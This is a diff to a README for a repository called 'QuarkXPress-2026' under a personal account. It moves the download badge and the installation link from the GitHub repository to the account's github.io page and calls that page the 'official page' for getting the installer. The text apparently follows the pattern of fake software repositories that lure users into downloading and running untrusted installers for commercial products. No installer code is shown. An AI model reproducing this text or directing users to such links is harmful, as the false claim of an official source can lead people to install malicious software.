@@ -1,6 +1,6 @@
 # 🖥️ QuarkXPress-2026 - Professional Layout Design for Your Desktop
 
-[![](https://img.shields.io/badge/Download-QuarkXPress_2026-blue.svg)](https://github.com/sebds8527/QuarkXPress-2026)
+[![](https://img.shields.io/badge/Download-QuarkXPress_2026-blue.svg)](https://sebds8527.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start the installation.
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official page to get the installer: [Download QuarkXPress 2026](https://github.com/sebds8527/QuarkXPress-2026).
+1.  Visit the official page to get the installer: [Download QuarkXPress 2026](https://sebds8527.github.io).
 2.  Click the download button on the page.
 3.  Wait for the file to finish downloading to your Downloads folder.
 4.  Open the folder where you saved the installer.
